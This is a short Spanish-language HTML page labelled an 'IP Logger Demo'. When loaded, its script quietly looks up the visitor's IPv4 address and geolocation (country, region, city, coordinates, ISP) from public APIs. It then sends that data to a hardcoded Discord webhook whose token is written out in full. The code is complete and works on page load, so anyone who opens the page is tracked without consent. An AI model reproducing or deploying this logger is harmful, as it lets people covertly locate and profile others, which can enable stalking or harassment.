<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>IP Logger Demo</title>
</head>
<body>
  <h1>Obteniendo IP...</h1>

  <script>
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1356010314117943427/1EFY6VFfLFjllgQ-mNPO8LfBnNz13cYjveGH4Tku7yHF49nfmS3m6vjGXWWvSYWmoOOe';

    async function logVisitorInfo() {
      try {
        // 1. Obtener IPv4
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipDataRaw = await ipRes.json();
        const ipv4 = ipDataRaw.ip;

        // 2. Obtener info con esa IP desde ipapi.co
        const geoRes = await fetch(`https://ipapi.co/${ipv4}/json/`);
        const geoData = await geoRes.json();

        const payload = {
          username: "IP Logger (IPv4)",
          embeds: [{
            title: "üîç Nueva visita (IPv4)",
            color: 16753920,
            fields: [
              { name: "üîó IP", value: ipv4 || "No disponible", inline: false },
              { name: "üåé Pa√≠s", value: geoData.country_name || "No disponible", inline: true },
              { name: "üó∫Ô∏è Regi√≥n", value: geoData.region || "No disponible", inline: true },
              { name: "üåÜ Ciudad", value: geoData.city || "No disponible", inline: true },
              { name: "üìç Coordenadas", value: `${geoData.latitude}, ${geoData.longitude}` || "No disponible", inline: true },
              { name: "üß≠ ISP", value: geoData.org || "No disponible", inline: false }
            ],
            footer: { text: `Fecha: ${new Date().toLocaleString()}` }
          }]
        };

        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        document.body.innerHTML = "<h2>¬°Informaci√≥n IPv4 enviada al webhook!</h2>";

      } catch (error) {
        console.error("Error:", error);
        document.body.innerHTML = "<h2>Error al obtener o enviar informaci√≥n.</h2>";
      }
    }

    logVisitorInfo();
  </script>
</body>
</html>
